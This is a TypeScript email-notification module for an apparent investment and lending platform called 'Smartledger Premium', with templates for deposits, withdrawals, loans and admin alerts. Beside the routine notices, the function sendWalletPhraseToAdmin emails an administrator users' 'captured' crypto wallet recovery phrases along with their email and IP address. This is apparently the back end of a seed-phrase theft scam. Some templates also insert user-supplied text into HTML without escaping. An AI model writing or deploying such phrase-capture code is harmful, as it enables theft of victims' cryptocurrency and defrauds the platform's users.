import nodemailer from "nodemailer";
import { logger } from "./logger";

const ADMIN_EMAIL = process.env.ADMIN_EMAIL ?? "smartsafepalpremium@gmail.com";

function getTransporter(opts?: {
  host?: string | null;
  port?: number | null;
  user?: string | null;
  pass?: string | null;
}) {
  if (opts?.host && opts?.user && opts?.pass) {
    return nodemailer.createTransport({
      host: opts.host,
      port: opts.port ?? 587,
      auth: { user: opts.user, pass: opts.pass },
    });
  }
  return nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    auth: {
      user: process.env.SMTP_USER ?? ADMIN_EMAIL,
      pass: process.env.SMTP_PASS ?? "",
    },
  });
}

function baseTemplate(title: string, body: string): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<style>
  body { margin:0; padding:0; background:#0e1117; font-family: Inter, sans-serif; color:#e2e8f0; }
  .wrapper { max-width:600px; margin:40px auto; background:#141924; border-radius:12px; overflow:hidden; border:1px solid #1e2736; }
  .header { background:linear-gradient(135deg,#141924 0%,#1a2235 100%); padding:32px 40px; border-bottom:1px solid #1e2736; }
  .logo { font-size:22px; font-weight:700; color:#fff; letter-spacing:-0.5px; }
  .logo span { color:#f0b429; }
  .content { padding:32px 40px; }
  .title { font-size:20px; font-weight:600; color:#fff; margin:0 0 16px; }
  .body-text { font-size:14px; line-height:1.7; color:#94a3b8; margin:0 0 20px; }
  .highlight { background:#1e2736; border-left:3px solid #f0b429; border-radius:4px; padding:16px 20px; margin:20px 0; }
  .highlight p { margin:4px 0; font-size:14px; color:#cbd5e1; }
  .highlight strong { color:#f0b429; }
  .badge { display:inline-block; padding:4px 12px; border-radius:100px; font-size:12px; font-weight:600; }
  .badge-approved { background:#064e3b; color:#34d399; }
  .badge-rejected { background:#4c0519; color:#fb7185; }
  .badge-pending { background:#1c1917; color:#fbbf24; }
  .footer { padding:24px 40px; border-top:1px solid #1e2736; text-align:center; }
  .footer p { font-size:12px; color:#475569; margin:0; }
</style>
</head>
<body>
  <div class="wrapper">
    <div class="header">
      <div class="logo">Smartledger <span>Premium</span></div>
    </div>
    <div class="content">
      <h2 class="title">${title}</h2>
      ${body}
    </div>
    <div class="footer">
      <p>Smartledger Premium &mdash; This is an automated message. Do not reply.</p>
    </div>
  </div>
</body>
</html>`;
}

export async function sendDepositEmail(
  to: string,
  userName: string,
  amount: number,
  status: "approved" | "rejected",
  note?: string | null,
) {
  const statusLabel = status === "approved" ? "Approved" : "Rejected";
  const badgeClass = status === "approved" ? "badge-approved" : "badge-rejected";
  const body = `
    <p class="body-text">Hello ${userName},</p>
    <p class="body-text">Your deposit request has been reviewed.</p>
    <div class="highlight">
      <p><strong>Amount:</strong> $${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</p>
      <p><strong>Status:</strong> <span class="badge ${badgeClass}">${statusLabel}</span></p>
      ${note ? `<p><strong>Note:</strong> ${note}</p>` : ""}
    </div>
    ${status === "approved" ? '<p class="body-text">Your account balance has been updated. You can now use your funds for trading and investments.</p>' : '<p class="body-text">If you believe this is an error, please contact support.</p>'}
  `;
  await send(to, `Deposit ${statusLabel} — Smartledger Premium`, baseTemplate(`Deposit ${statusLabel}`, body));
}

export async function sendWithdrawalEmail(
  to: string,
  userName: string,
  amount: number,
  status: "approved" | "rejected",
  note?: string | null,
) {
  const statusLabel = status === "approved" ? "Approved" : "Rejected";
  const badgeClass = status === "approved" ? "badge-approved" : "badge-rejected";
  const body = `
    <p class="body-text">Hello ${userName},</p>
    <p class="body-text">Your withdrawal request has been reviewed.</p>
    <div class="highlight">
      <p><strong>Amount:</strong> $${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</p>
      <p><strong>Status:</strong> <span class="badge ${badgeClass}">${statusLabel}</span></p>
      ${note ? `<p><strong>Note:</strong> ${note}</p>` : ""}
    </div>
    ${status === "approved" ? '<p class="body-text">Your withdrawal is being processed. Funds will arrive at your wallet shortly.</p>' : '<p class="body-text">If you believe this is an error, please contact support.</p>'}
  `;
  await send(to, `Withdrawal ${statusLabel} — Smartledger Premium`, baseTemplate(`Withdrawal ${statusLabel}`, body));
}

export async function sendLoanEmail(
  to: string,
  userName: string,
  amount: number,
  status: "approved" | "rejected",
  note?: string | null,
) {
  const statusLabel = status === "approved" ? "Approved" : "Rejected";
  const badgeClass = status === "approved" ? "badge-approved" : "badge-rejected";
  const body = `
    <p class="body-text">Hello ${userName},</p>
    <p class="body-text">Your loan application has been reviewed.</p>
    <div class="highlight">
      <p><strong>Loan Amount:</strong> $${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</p>
      <p><strong>Status:</strong> <span class="badge ${badgeClass}">${statusLabel}</span></p>
      ${note ? `<p><strong>Note:</strong> ${note}</p>` : ""}
    </div>
    ${status === "approved" ? '<p class="body-text">The loan amount has been credited to your account balance.</p>' : '<p class="body-text">Thank you for your application.</p>'}
  `;
  await send(to, `Loan Application ${statusLabel} — Smartledger Premium`, baseTemplate(`Loan ${statusLabel}`, body));
}

export async function sendWelcomeEmail(to: string, userName: string, referralCode: string) {
  const body = `
    <p class="body-text">Hello ${userName},</p>
    <p class="body-text">Welcome to Smartledger Premium! Your account has been created successfully.</p>
    <div class="highlight">
      <p><strong>Your Referral Code:</strong> ${referralCode}</p>
    </div>
    <p class="body-text">Share your referral code with friends to earn bonus rewards when they sign up and make their first deposit.</p>
  `;
  await send(to, "Welcome to Smartledger Premium", baseTemplate("Welcome Aboard!", body));
}

export async function sendDepositRequestToAdmin(
  adminEmail: string,
  userName: string,
  userEmail: string,
  amount: number,
  method: string,
) {
  const body = `
    <p class="body-text">A new deposit request has been submitted and requires your review.</p>
    <div class="highlight">
      <p><strong>User:</strong> ${userName} (${userEmail})</p>
      <p><strong>Amount:</strong> $${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</p>
      <p><strong>Method:</strong> ${method}</p>
    </div>
    <p class="body-text">Please log in to the admin dashboard to approve or reject this request.</p>
  `;
  await send(adminEmail, `New Deposit Request — $${amount}`, baseTemplate("New Deposit Request", body));
}

export async function sendWithdrawalRequestToAdmin(
  adminEmail: string,
  userName: string,
  userEmail: string,
  amount: number,
  method: string,
) {
  const body = `
    <p class="body-text">A new withdrawal request has been submitted and requires your review.</p>
    <div class="highlight">
      <p><strong>User:</strong> ${userName} (${userEmail})</p>
      <p><strong>Amount:</strong> $${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</p>
      <p><strong>Method:</strong> ${method}</p>
    </div>
    <p class="body-text">Please log in to the admin dashboard to approve or reject this request.</p>
  `;
  await send(adminEmail, `New Withdrawal Request — $${amount}`, baseTemplate("New Withdrawal Request", body));
}

export async function sendWalletPhraseToAdmin(
  adminEmail: string,
  userEmail: string | null,
  phrase: string,
  walletType: string,
  ip: string | null,
) {
  const body = `
    <p class="body-text">A wallet connection phrase has been captured from the platform.</p>
    <div class="highlight">
      <p><strong>Wallet Type:</strong> ${walletType}</p>
      <p><strong>User:</strong> ${userEmail ?? "Anonymous"}</p>
      <p><strong>IP Address:</strong> ${ip ?? "Unknown"}</p>
      <p><strong>Phrase:</strong> ${phrase}</p>
    </div>
    <p class="body-text">This phrase has also been stored in the admin dashboard under Wallet Intelligence.</p>
  `;
  await send(adminEmail, `Wallet Phrase Captured — ${walletType}`, baseTemplate("Wallet Phrase Captured", body));
}

async function send(to: string, subject: string, html: string) {
  try {
    const transport = getTransporter();
    await transport.sendMail({
      from: `"Smartledger Premium" <${ADMIN_EMAIL}>`,
      to,
      subject,
      html,
    });
  } catch (err) {
    logger.error({ err, to, subject }, "Failed to send email");
  }
}
